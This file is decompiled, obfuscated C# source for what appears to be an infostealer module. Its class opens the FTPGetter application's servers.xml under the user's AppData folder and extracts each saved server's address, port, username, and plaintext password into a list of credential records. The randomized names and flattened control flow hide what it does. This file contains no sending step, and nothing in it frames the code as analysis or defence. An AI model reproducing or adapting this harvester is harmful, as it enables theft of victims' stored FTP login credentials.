using System;
using System.Collections.Generic;
using System.IO;
using System.Runtime.CompilerServices;
using p3N5Y;
using q9Ep;

namespace ZAZUx;

public class KJXFS : MnVCfk
{
	[CompilerGenerated]
	private string Application__BackingField;

	public string _1ohO4L3gh8t
	{
		[CompilerGenerated]
		get
		{
			return Application__BackingField;
		}
		[CompilerGenerated]
		set
		{
			Application__BackingField = value;
		}
	}

	public KJXFS()
	{
		_1ohO4L3gh8t = "FTPGetter";
	}

	public List<ii68> Grab()
	{
		int num = 0;
		string path = default;
		List<ii68> list = default;
		string[] array = default;
		while (true)
		{
			if (num == 2)
			{
				path = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\FTPGetter\\servers.xml";
				num = 3;
			}
			if (num != 5)
			{
				if (num == 4)
				{
					return list;
				}
				if (num == 3)
				{
					if (File.Exists(path))
					{
						goto IL_0051;
					}
					num = 4;
				}
				if (num == 1)
				{
					list = new List<ii68>();
					num = 2;
				}
				if (num == 0)
				{
					num = 1;
				}
				if (num == 6)
				{
					break;
				}
				continue;
			}
			goto IL_0051;
			IL_0051:
			array = File.ReadAllText(path).gy6HND7Xm("<server>");
			if (array != null)
			{
				break;
			}
			return list;
		}
		string[] array2 = array;
		foreach (string text in array2)
		{
			string[] array3 = text.gy6HND7Xm(Environment.NewLine);
			string[] array4 = array3;
			foreach (string text2 in array4)
			{
				try
				{
					ii68 ii69 = new ii68();
					if (text2.Contains("<server_ip>"))
					{
						ii69.byIdLuuGZbL = b4v.x8jPE1(text2, "<server_ip>", "</server_ip>") + ":" + b4v.x8jPE1(text2, "<server_port>", "</server_port>");
					}
					if (text2.Contains("<server_user_name>"))
					{
						ii69.S8v = b4v.x8jPE1(text2, "<server_user_name>", "</server_user_name>");
					}
					if (text2.Contains("<server_user_password>"))
					{
						ii69._9H5rP7hg2 = b4v.x8jPE1(text2, "<server_user_password>", "</server_user_password>");
					}
					ii69.oVAe = "FTPGetter";
					if (!string.IsNullOrEmpty(ii69.S8v) && !string.IsNullOrEmpty(ii69.byIdLuuGZbL))
					{
						list.Add(ii69);
					}
				}
				catch
				{
				}
			}
		}
		return list;
	}
}
